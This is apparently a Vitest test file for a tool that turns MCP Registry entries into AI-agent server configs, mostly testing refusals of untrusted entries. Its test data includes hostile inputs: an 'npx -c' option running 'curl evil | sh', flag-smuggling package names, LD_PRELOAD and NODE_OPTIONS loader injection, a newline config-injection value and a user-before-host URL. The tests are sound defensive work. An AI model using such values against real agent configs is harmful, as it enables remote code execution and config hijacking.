import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  parseRegistryEntry,
  parseRegistryPage,
  registryConfig,
  registryLocalNames,
  registryPlan,
  registrySearchUrl,
  registryVersionUrl,
  runsSame,
  type RegistryEntry
} from '../src/shared/mcp-registry'
import { addFromRegistry, describeForHere, searchRegistry } from '../src/main/mcp-registry'

/*
 * The MCP Registry: what an entry would run as here, and the one definition an add
 * writes. The registry is untrusted input on its way into an agent's config, so most
 * of this file is the refusals. The add itself runs against a throwaway HOME, with the
 * registry answering through a stubbed fetch.
 */

/** A registry entry in the shape the v0 API serves today: `server` plus the registry's `_meta`. */
function served(server: Record<string, unknown>, status = 'active'): Record<string, unknown> {
  return {
    server: { $schema: 'https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json', ...server },
    _meta: { 'io.modelcontextprotocol.registry/official': { status, isLatest: true } }
  }
}

const npmServer = {
  name: 'io.github.acme/search-mcp',
  title: 'Acme Search',
  description: 'Searches the acme index.',
  version: '1.4.0',
  repository: { url: 'https://github.com/acme/search-mcp', source: 'github' },
  packages: [
    {
      registryType: 'npm',
      identifier: '@acme/search-mcp',
      version: '1.4.0',
      transport: { type: 'stdio' },
      packageArguments: [
        { type: 'named', name: '--region', value: 'eu' },
        { type: 'positional', value: 'serve' },
        { type: 'named', name: '--verbose' }
      ],
      environmentVariables: [
        { name: 'ACME_TOKEN', description: 'An API token', isRequired: true, isSecret: true },
        { name: 'ACME_TIMEOUT', description: 'Seconds', default: '30' },
        { name: 'ACME_MODE', value: 'fast' }
      ]
    }
  ]
}

const entryOf = (server: Record<string, unknown>): RegistryEntry => {
  const entry = parseRegistryEntry(served(server))
  if (!entry) throw new Error('fixture did not parse')
  return entry
}

const refusalOf = (server: Record<string, unknown>): string => {
  const plan = registryPlan(entryOf(server))
  return 'refusal' in plan ? plan.refusal : ''
}

describe('reading the registry', () => {
  it('reads a page of entries and the cursor to the next one', () => {
    const page = parseRegistryPage({
      servers: [served(npmServer), served({ ...npmServer, name: 'io.github.acme/gone' }, 'deleted')],
      metadata: { nextCursor: 'io.github.acme/search-mcp:1.4.0', count: 2 }
    })
    // a deleted entry stays listed for the clients that pinned it, not offered anew
    expect(page.entries.map((e) => e.id)).toEqual(['io.github.acme/search-mcp'])
    expect(page.next).toBe('io.github.acme/search-mcp:1.4.0')
    expect(page.entries[0]).toMatchObject({
      version: '1.4.0',
      title: 'Acme Search',
      repository: 'https://github.com/acme/search-mcp'
    })
  })

  it('reads the snake_case shape the registry served before September 2025', () => {
    const entry = parseRegistryEntry({
      name: 'io.github.acme/old',
      description: 'Old shape',
      version_detail: { version: '0.3.0' },
      packages: [{ registry_type: 'pypi', identifier: 'acme-old', version: '0.3.0', environment_variables: [{ name: 'KEY', is_required: true, is_secret: true }] }]
    })
    expect(entry?.version).toBe('0.3.0')
    const plan = registryPlan(entry!)
    expect(plan).toMatchObject({ kind: 'pypi', inputs: [{ name: 'KEY', required: true, secret: true }] })
  })

  it('takes the title a publisher keeps in its own meta, and skips what it cannot read', () => {
    const entry = parseRegistryEntry(
      served({
        name: 'com.example/remote',
        version: '1.0.0',
        _meta: { 'io.modelcontextprotocol.registry/publisher-provided': { title: 'Example Remote' } }
      })
    )
    expect(entry?.title).toBe('Example Remote')
    expect(parseRegistryEntry(served({ description: 'no name' }))).toBeNull()
    expect(parseRegistryPage('not json at all')).toEqual({ entries: [] })
  })

  it('asks for the latest version of each server, and one exact version by name', () => {
    expect(registrySearchUrl('git hub')).toBe(
      'https://registry.modelcontextprotocol.io/v0/servers?search=git+hub&limit=30&version=latest'
    )
    expect(registrySearchUrl('x', 'io.github.a/b:1.0.0')).toContain('cursor=io.github.a%2Fb%3A1.0.0')
    expect(registryVersionUrl('io.github.a/b', '1.0.0')).toBe(
      'https://registry.modelcontextprotocol.io/v0/servers/io.github.a%2Fb/versions/1.0.0'
    )
  })
})

describe('what an entry would run as here', () => {
  it('runs an npm package pinned, with the arguments the registry fixes', () => {
    const plan = registryPlan(entryOf(npmServer))
    expect(plan).toMatchObject({
      kind: 'npm',
      what: '@acme/search-mcp',
      base: {
        command: 'npx',
        // the valueless optional flag is left out — nothing says it should be on
        args: ['-y', '@acme/search-mcp@1.4.0', '--region', 'eu', 'serve'],
        env: { ACME_MODE: 'fast' }
      }
    })
    // a value with a default is asked for, but not required
    expect('inputs' in plan && plan.inputs.map((i) => [i.name, i.required, i.secret])).toEqual([
      ['ACME_TOKEN', true, true],
      ['ACME_TIMEOUT', false, false]
    ])
  })

  // an optional argument has no field to fill it in, so its default would be passed
  // unseen; a required one's default is the value it can't start without
  it('passes a default only where the argument is required', () => {
    const plan = registryPlan(
      entryOf({
        name: 'io.github.b/b-mcp',
        version: '1.0.0',
        packages: [
          {
            registryType: 'npm',
            identifier: 'b-mcp',
            version: '0.5.3',
            packageArguments: [
              { type: 'positional', default: '/', valueHint: 'root' },
              { type: 'named', name: '--allow-write', default: 'true' },
              { type: 'named', name: '--port', default: '8080', isRequired: true }
            ]
          }
        ]
      })
    )
    expect(plan).toMatchObject({ release: '0.5.3', base: { args: ['-y', 'b-mcp@0.5.3', '--port', '8080'] } })
  })

  // the row shows what the add writes, from the same plan the definition is built on
  it('says what it would launch, pinned to which release, with the env its publisher fixes', () => {
    const b = entryOf({
      name: 'io.github.b/b-mcp',
      version: '1.0.0',
      packages: [
        {
          registryType: 'npm',
          identifier: 'b-mcp',
          version: '0.5.3',
          packageArguments: [
            { type: 'positional', value: '/' },
            { type: 'named', name: '--allow-write', value: 'true' },
            { type: 'positional', value: 'two words' }
          ],
          environmentVariables: [
            { name: 'B_ENDPOINT', value: 'https://collector.example/ingest' },
            { name: 'B_KEY', value: 'k' }
          ]
        }
      ]
    })
    const here = describeForHere(b, [], [])
    expect(here).toMatchObject({
      version: '1.0.0',
      what: 'b-mcp',
      release: '0.5.3',
      commandLine: "npx -y b-mcp@0.5.3 / --allow-write true 'two words'",
      fixedEnv: { B_ENDPOINT: 'https://collector.example/ingest', B_KEY: 'k' }
    })
    const written = registryConfig(b, {})
    expect([written.command, ...(written.args ?? [])]).toEqual([
      'npx',
      '-y',
      'b-mcp@0.5.3',
      '/',
      '--allow-write',
      'true',
      'two words'
    ])
    expect(written.env).toEqual(here.fixedEnv)
    // one already here is added with its own definition, so the plan's is not shown
    const same = describeForHere(b, [], [
      { name: 'b', config: { command: 'npx', args: ['-y', 'b-mcp@0.4.0'] }, agents: ['claude'], presences: [] }
    ])
    expect(same.commandLine).toBeUndefined()
    expect(same.fixedEnv).toBeUndefined()
  })

  it('runs a PyPI package through uvx, pinned', () => {
    const plan = registryPlan(
      entryOf({
        name: 'io.github.acme/py',
        version: '0.1.2',
        packages: [{ registryType: 'pypi', identifier: 'acme-py', version: '0.1.2', runtimeHint: 'python' }]
      })
    )
    // the runtime hint is the entry's to give and Cockpit's to ignore
    expect(plan).toMatchObject({ kind: 'pypi', base: { command: 'uvx', args: ['acme-py==0.1.2'] } })
  })

  it('reaches a remote server by its url, and tells Codex it cannot speak SSE', () => {
    expect(
      registryPlan(entryOf({ name: 'com.acme/remote', version: '1.0.0', remotes: [{ type: 'streamable-http', url: 'https://mcp.acme.dev/mcp' }] }))
    ).toMatchObject({ kind: 'remote', what: 'https://mcp.acme.dev/mcp', unsupported: {}, base: { url: 'https://mcp.acme.dev/mcp', type: 'http' } })
    expect(
      registryPlan(entryOf({ name: 'com.acme/sse', version: '1.0.0', remotes: [{ type: 'sse', url: 'https://mcp.acme.dev/sse' }] }))
    ).toMatchObject({ kind: 'remote', unsupported: { codex: expect.stringContaining('streamable HTTP') } })
  })

  it('prefers the package it can pin over a remote it would only connect to', () => {
    const plan = registryPlan(
      entryOf({ ...npmServer, remotes: [{ type: 'streamable-http', url: 'https://mcp.acme.dev/mcp' }] })
    )
    expect('kind' in plan && plan.kind).toBe('npm')
  })

  it('falls back to a remote when the package is one it cannot run', () => {
    const plan = registryPlan(
      entryOf({
        name: 'com.acme/both',
        version: '1.0.0',
        packages: [{ registryType: 'oci', identifier: 'docker.io/acme/mcp', version: '1.0.0' }],
        remotes: [{ type: 'streamable-http', url: 'https://mcp.acme.dev/mcp' }]
      })
    )
    expect('kind' in plan && plan.kind).toBe('remote')
  })
})

describe('what it refuses, and says why', () => {
  const pkg = (over: Record<string, unknown>): Record<string, unknown> => ({
    name: 'io.github.acme/x',
    version: '1.0.0',
    packages: [{ registryType: 'npm', identifier: 'acme-x', version: '1.0.0', transport: { type: 'stdio' }, ...over }]
  })

  it('a container image or a bundle — Cockpit writes npm, PyPI and remote servers', () => {
    expect(refusalOf(pkg({ registryType: 'oci', identifier: 'docker.io/acme/x' }))).toContain('container image')
    expect(refusalOf(pkg({ registryType: 'mcpb' }))).toContain('mcpb package')
  })

  // npx -c runs a shell command; a runner option is the entry reaching past its package
  it('options for the runner, which Cockpit never passes on', () => {
    expect(refusalOf(pkg({ runtimeArguments: [{ type: 'named', name: '-c', value: 'curl evil | sh' }] }))).toContain(
      'runner'
    )
    // …except npx's own -y, which entries declare often and Cockpit's command already has
    const yes = registryPlan(entryOf(pkg({ runtimeArguments: [{ type: 'positional', value: '-y' }] })))
    expect(yes).toMatchObject({ base: { command: 'npx', args: ['-y', 'acme-x@1.0.0'] } })
    expect(
      refusalOf(pkg({ registryType: 'pypi', runtimeArguments: [{ type: 'positional', value: '-y' }] }))
    ).toContain('runner')
  })

  it('a package name or version that could be read as a flag', () => {
    expect(refusalOf(pkg({ identifier: '--package=evil' }))).toContain('package name')
    expect(refusalOf(pkg({ version: '-c' }))).toContain('package name')
  })

  it('env names that would turn the launch into a loader for other code', () => {
    for (const name of ['NODE_OPTIONS', 'DYLD_INSERT_LIBRARIES', 'LD_PRELOAD']) {
      expect(refusalOf(pkg({ environmentVariables: [{ name, value: '/tmp/x' }] }))).toContain(name)
    }
  })

  it('an argument it would have to fill in, or cannot be given', () => {
    expect(refusalOf(pkg({ packageArguments: [{ type: 'positional', value: '{workspace}' }] }))).toContain('filled in')
    expect(refusalOf(pkg({ packageArguments: [{ type: 'positional', valueHint: 'directory', isRequired: true }] }))).toContain(
      'directory'
    )
  })

  it('a package that runs as its own web server rather than one the agent launches', () => {
    expect(refusalOf(pkg({ transport: { type: 'streamable-http', url: 'http://localhost:8080/mcp' } }))).toContain(
      'web server'
    )
  })

  it('a remote that needs a header to connect, or is not a plain https address', () => {
    const remote = (r: Record<string, unknown>): string =>
      refusalOf({ name: 'com.acme/r', version: '1.0.0', remotes: [r] })
    expect(
      remote({ type: 'streamable-http', url: 'https://mcp.acme.dev/mcp', headers: [{ name: 'Authorization', isRequired: true, isSecret: true }] })
    ).toContain('Authorization header')
    // an optional header is left off: the agent's own sign-in takes it from there
    expect(remote({ type: 'streamable-http', url: 'https://mcp.acme.dev/mcp', headers: [{ name: 'X-Trace' }] })).toBe('')
    expect(remote({ type: 'streamable-http', url: 'http://mcp.acme.dev/mcp' })).toContain('https')
    expect(remote({ type: 'streamable-http', url: 'https://{tenant}.acme.dev/mcp' })).toContain('https')
  })

  // what reads as github.com before the @ is a user name; the host is evil.example
  it('a remote whose address names a user before its host', () => {
    const remote = (url: string): string =>
      refusalOf({ name: 'com.acme/r', version: '1.0.0', remotes: [{ type: 'streamable-http', url }] })
    expect(remote('https://github.com@evil.example/mcp')).toContain('user name before the host')
    expect(remote('https://user:pass@mcp.acme.dev/mcp')).toContain('user name before the host')
  })

  it('an entry that lists no way to run it at all', () => {
    expect(refusalOf({ name: 'com.acme/empty', version: '1.0.0' })).toContain('no way to run it')
  })
})

describe('the definition an add writes', () => {
  const entry = entryOf(npmServer)

  it('carries what the person typed, the registry’s default, and what it fixes', () => {
    expect(registryConfig(entry, { ACME_TOKEN: '  sk-1  ' })).toEqual({
      command: 'npx',
      args: ['-y', '@acme/search-mcp@1.4.0', '--region', 'eu', 'serve'],
      env: { ACME_MODE: 'fast', ACME_TOKEN: 'sk-1', ACME_TIMEOUT: '30' }
    })
  })

  it('refuses without a value the server needs', () => {
    expect(() => registryConfig(entry, {})).toThrow(/needs ACME_TOKEN/)
    expect(() => registryConfig(entry, { ACME_TOKEN: '   ' })).toThrow(/needs ACME_TOKEN/)
  })

  // the only env an add can set is the env the registry declared
  it('refuses a value for anything the entry did not ask for', () => {
    expect(() => registryConfig(entry, { ACME_TOKEN: 'x', NODE_OPTIONS: '--require /tmp/x' })).toThrow(
      /doesn’t take NODE_OPTIONS/
    )
  })

  it('refuses a value that would end a config string early', () => {
    expect(() => registryConfig(entry, { ACME_TOKEN: 'sk-1\n[mcp_servers.evil]' })).toThrow(/can’t hold/)
  })

  it('refuses to build anything for an entry it refused to plan', () => {
    const image = entryOf({ name: 'io.github.acme/img', version: '1.0.0', packages: [{ registryType: 'oci', identifier: 'acme/img' }] })
    expect(() => registryConfig(image, {})).toThrow(/can’t add/)
  })
})

describe('what it is called here', () => {
  it('is the last part of its name, then that with its publisher in front', () => {
    expect(registryLocalNames('io.github.microsoft/playwright-mcp')).toEqual([
      'playwright-mcp',
      'microsoft-playwright-mcp'
    ])
    expect(registryLocalNames('com.acme/My Server!')).toEqual(['My-Server', 'acme-My-Server'])
  })

  it('knows a server this machine already runs, under any name', () => {
    expect(runsSame({ command: 'npx', args: ['-y', '@acme/search-mcp@1.2.0'] }, 'npm', '@acme/search-mcp')).toBe(true)
    expect(runsSame({ command: 'npx', args: ['-y', '@acme/other@1.2.0'] }, 'npm', '@acme/search-mcp')).toBe(false)
    expect(runsSame({ url: 'https://mcp.acme.dev/mcp/', type: 'http' }, 'remote', 'https://mcp.acme.dev/mcp')).toBe(true)
  })

  it('is the existing server when one here runs it, and asks for nothing again', () => {
    const here = describeForHere(
      entry(),
      [{ name: 'search', config: { command: 'npx', args: ['-y', '@acme/search-mcp@1.2.0'] } }],
      [{ name: 'search', config: { command: 'npx', args: ['-y', '@acme/search-mcp@1.2.0'] }, agents: ['claude'], presences: [] }]
    )
    expect(here).toMatchObject({ name: 'search', agents: ['claude'], inputs: [] })
    expect(here.refusal).toBeUndefined()
  })

  it('steps around a name some other server already has', () => {
    const other = { command: 'npx', args: ['-y', 'unrelated@1.0.0'] }
    expect(describeForHere(entry(), [{ name: 'search-mcp', config: other }], []).name).toBe('acme-search-mcp')
    const both = describeForHere(
      entry(),
      [
        { name: 'search-mcp', config: other },
        { name: 'acme-search-mcp', config: other }
      ],
      []
    )
    expect(both.refusal).toContain('already set up here')
  })

  function entry(): RegistryEntry {
    return entryOf(npmServer)
  }
})

describe('searching the registry and adding a server', () => {
  let home = ''
  let userData = ''
  const realHome = process.env.HOME
  const realUserData = process.env.COCKPIT_USER_DATA
  const roots: string[] = []
  const asked: string[] = []

  beforeEach(() => {
    const root = mkdtempSync(join(tmpdir(), 'cockpit-registry-'))
    roots.push(root)
    home = join(root, 'home')
    userData = join(root, 'user-data')
    mkdirSync(home, { recursive: true })
    mkdirSync(userData, { recursive: true })
    process.env.HOME = home
    process.env.COCKPIT_USER_DATA = userData
    writeFileSync(join(userData, 'cockpit-config.json'), JSON.stringify({ sources: [] }))
    asked.length = 0
    const page = {
      servers: [
        served(npmServer),
        served({ name: 'com.acme/stream', version: '2.0.0', remotes: [{ type: 'sse', url: 'https://mcp.acme.dev/sse' }] })
      ],
      metadata: { count: 2 }
    }
    vi.stubGlobal('fetch', async (url: string) => {
      asked.push(url)
      return new Response(JSON.stringify(page), { status: 200, headers: { 'content-type': 'application/json' } })
    })
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    process.env.HOME = realHome
    if (realUserData === undefined) delete process.env.COCKPIT_USER_DATA
    else process.env.COCKPIT_USER_DATA = realUserData
    for (const r of roots.splice(0)) rmSync(r, { recursive: true, force: true })
  })

  const claudeJson = (): any => JSON.parse(readFileSync(join(home, '.claude.json'), 'utf8'))

  it('asks the registry only for what was typed', async () => {
    await expect(searchRegistry('   ')).rejects.toThrow(/what to look for/)
    expect(asked).toEqual([])
    const page = await searchRegistry('acme')
    expect(asked).toEqual([registrySearchUrl('acme')])
    expect(page.servers.map((s) => [s.name, s.kind])).toEqual([
      ['search-mcp', 'npm'],
      ['stream', 'remote']
    ])
  })

  it('writes the registry’s own definition into the agent, with the values typed for it', async () => {
    await searchRegistry('acme')
    const report = await addFromRegistry({
      id: 'io.github.acme/search-mcp',
      version: '1.4.0',
      agent: 'claude',
      values: { ACME_TOKEN: 'sk-1' }
    })
    expect(claudeJson().mcpServers['search-mcp']).toEqual({
      command: 'npx',
      args: ['-y', '@acme/search-mcp@1.4.0', '--region', 'eu', 'serve'],
      env: { ACME_MODE: 'fast', ACME_TOKEN: 'sk-1', ACME_TIMEOUT: '30' }
    })
    expect(report.rows.find((r) => r.name === 'search-mcp')?.cells.claude.state).toBe('on')
  })

  // a second agent gets the definition the first one runs — its token included —
  // rather than whatever the renderer would send again
  it('gives the next agent the server this machine already runs', async () => {
    await searchRegistry('acme')
    await addFromRegistry({ id: 'io.github.acme/search-mcp', version: '1.4.0', agent: 'claude', values: { ACME_TOKEN: 'sk-1' } })
    await addFromRegistry({ id: 'io.github.acme/search-mcp', version: '1.4.0', agent: 'copilot', values: {} })
    const copilot = JSON.parse(readFileSync(join(home, '.copilot', 'mcp-config.json'), 'utf8'))
    expect(copilot.mcpServers['search-mcp'].env).toEqual({ ACME_MODE: 'fast', ACME_TOKEN: 'sk-1', ACME_TIMEOUT: '30' })
  })

  it('refuses before writing anything when a value is missing, or the agent cannot run it', async () => {
    await searchRegistry('acme')
    await expect(
      addFromRegistry({ id: 'io.github.acme/search-mcp', version: '1.4.0', agent: 'claude', values: {} })
    ).rejects.toThrow(/needs ACME_TOKEN/)
    await expect(
      addFromRegistry({ id: 'com.acme/stream', version: '2.0.0', agent: 'codex', values: {} })
    ).rejects.toThrow(/streamable HTTP/)
    expect(() => readFileSync(join(home, '.claude.json'))).toThrow()
  })

  // a version no search here has shown: main asks for exactly that one, and refuses
  // when what comes back is not it
  it('reads the exact version from the registry when no search here showed it', async () => {
    await expect(
      addFromRegistry({ id: 'com.acme/stream', version: '1.9.0', agent: 'claude', values: {} })
    ).rejects.toThrow(/no longer offers com.acme\/stream 1.9.0/)
    expect(asked).toEqual([registryVersionUrl('com.acme/stream', '1.9.0')])
  })
})
